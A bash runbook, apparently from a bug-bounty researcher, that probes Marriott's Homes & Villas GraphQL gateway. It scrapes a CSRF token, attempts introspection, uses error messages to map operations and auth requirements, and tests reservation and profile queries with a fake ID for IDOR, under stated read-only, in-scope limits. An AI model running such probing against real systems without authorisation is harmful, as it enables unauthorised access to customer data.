#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV GraphQL hunt (CSRF solved) — session41
# Portable: Linux / Pi / Termux.
#
# s40 SOLVED CSRF: header "x-hvmi-csrf-token" + the __NEXT_DATA__ csrfToken value
# reaches /gateway/graphql (got 500 on raw introspection = past the gate).
# Now map the API and test the auth model:
#   A. Connectivity ({__typename}) + a clean introspection retry
#   B. Error-oracle every READ op -> learn required args (id?) and whether each
#      needs a session (auth error) vs returns data unauthenticated
#   C. Focus user ops (reservationDetails/getProfileDetails/getTotalReservationData/
#      freedomPayDetails) with a SYNTHETIC id -> auth-required vs data (the IDOR tell)
#
# SAFETY: in-scope. READ-ONLY queries only. NO mutations (doBook, cancelReservation,
# updateSecondPayment, sendEmail) and NO getOTP/validateMFA (avoid sending OTP/
# side effects). Synthetic/own ids only. STOP on any real third-party PII.
#
# Run (Termux): OUTDIR=$HOME/s41 bash runbooks/PI-RUNBOOK-session41-hnv-gql-hunt.sh \
#                 2>&1 | tee $HOME/s41/s41.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s41
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s41"
  else OUTDIR="$HOME/s41"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"

echo "============================================================"
echo "HNV GQL HUNT  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"; echo "============================================================"; echo ""

# fresh token + jar. The app sends the value of #sourceid[data-source] (per the
# Apollo setContext in the JS); fall back to __NEXT_DATA__ csrfToken if absent.
curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
TOK=$(grep -oE 'id="sourceid"[^>]*data-source="[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
[ -z "$TOK" ] && TOK=$(grep -oE 'data-source="[^"]+"[^>]*id="sourceid"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
[ -z "$TOK" ] && TOK=$(grep -oE '"csrfToken":"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
echo "csrf token: ${TOK:0:34}...   header: x-hvmi-csrf-token"
echo ""

gq() { # json-query tag  -> code|size ; saves body
  local q="$1" tag="$2"
  curl -s -o "$OUTDIR/$tag.json" -b "$JAR" \
    -H "User-Agent: $UA" -H "$IDH" \
    -H 'Content-Type: application/json' -H 'Accept: application/json' \
    -H "Origin: $B" -H "Referer: $B/" -H "x-hvmi-csrf-token: $TOK" \
    --max-time 20 --data "$q" \
    -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0"
}

echo "═══ PHASE A: CONNECTIVITY + INTROSPECTION ═══"
m=$(gq '{"query":"{__typename}"}' a-typename)
echo "  {__typename} -> ${m%|*}|${m#*|}B :: $(head -c 120 "$OUTDIR/a-typename.json"|tr '\n' ' ')"
m=$(gq '{"query":"query IntrospectionQuery{__schema{queryType{name} types{name kind fields{name}}}}"}' a-introspect)
echo "  introspection -> ${m%|*}|${m#*|}B"
if grep -q '"__schema"' "$OUTDIR/a-introspect.json" 2>/dev/null; then
  echo "  *** INTROSPECTION ENABLED:"
  python3 - << 'PYEOF'
import os,json
O=os.environ["OUTDIR"]
try:
  d=json.load(open(f"{O}/a-introspect.json"))
  ts=d["data"]["__schema"]["types"]
  q=[t for t in ts if t["name"]=="Query"]
  if q and q[0].get("fields"):
    print("    Query fields:")
    for f in q[0]["fields"][:60]: print("      ",f["name"])
  print("    total types:",len([t for t in ts if not t["name"].startswith("__")]))
  open(f"{O}/schema-types.txt","w").write("\n".join(t["name"] for t in ts))
except Exception as e: print("    parse:",e)
PYEOF
else
  echo "    introspection blocked: $(head -c 140 "$OUTDIR/a-introspect.json"|tr '\n' ' ')"
fi
echo ""

echo "═══ PHASE B: ERROR-ORACLE READ OPS (args + auth model) ═══"
# Read-only ops; query each with an empty selection to provoke a revealing error.
for OP in properties propertyDetails PropertyAvailability bulkQuote quote tiles \
          relatedMarkets FilterLocations nearbyLovLocation googleLocationSuggestions \
          bookingCount travelInsuranceDetails validateAssociateDiscountCode \
          reservationDetails getProfileDetails getTotalReservationData freedomPayDetails; do
  m=$(gq "{\"query\":\"query{${OP}{__typename}}\"}" "b-$OP")
  code="${m%|*}"; size="${m#*|}"
  printf '  %-28s [%s %4sB] %s\n' "$OP" "$code" "$size" "$(head -c 170 "$OUTDIR/b-$OP.json"|tr '\n' ' ')"
  sleep 0.4
done
echo ""

echo "═══ PHASE C: USER-OPS AUTH TEST (synthetic id only) ═══"
# Use an obviously-fake id; we want auth-required vs data-returned, NOT real data.
for SPEC in \
  'reservationDetails|query R($id:String!){reservationDetails(id:$id){__typename}}|{"id":"TEST00000000"}' \
  'getTotalReservationData|query R($id:String!){getTotalReservationData(reservationId:$id){__typename}}|{"id":"TEST00000000"}' \
  'getProfileDetails|query P{getProfileDetails{__typename}}|{}' ; do
  OP="${SPEC%%|*}"; rest="${SPEC#*|}"; Q="${rest%%|*}"; V="${rest#*|}"
  m=$(gq "{\"query\":\"${Q//\"/\\\"}\",\"variables\":$V}" "c-$OP")
  echo "  $OP -> ${m%|*}|${m#*|}B :: $(head -c 220 "$OUTDIR/c-$OP.json"|tr '\n' ' ')"
  sleep 0.4
done
echo ""

echo "════════════════════════════════════════════"
echo "READING THE RESULT"
echo "════════════════════════════════════════════"
echo "  - Op returns \"data\" with synthetic id / no session -> UNAUTH data access."
echo "    For an id-bearing op that's cross-user data = IDOR (then verify carefully"
echo "    with own/synthetic ids only; STOP on real PII)."
echo "  - Op error 'Unauthorized'/'session'/'login' -> session-gated; capture"
echo "    hvmi_signInToken via an authenticated HnV browser session and re-test."
echo "  - Validation error naming an arg (e.g. 'id') -> that's the IDOR parameter."
echo "  - Introspection enabled -> full schema in schema-types.txt; map all id ops."
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
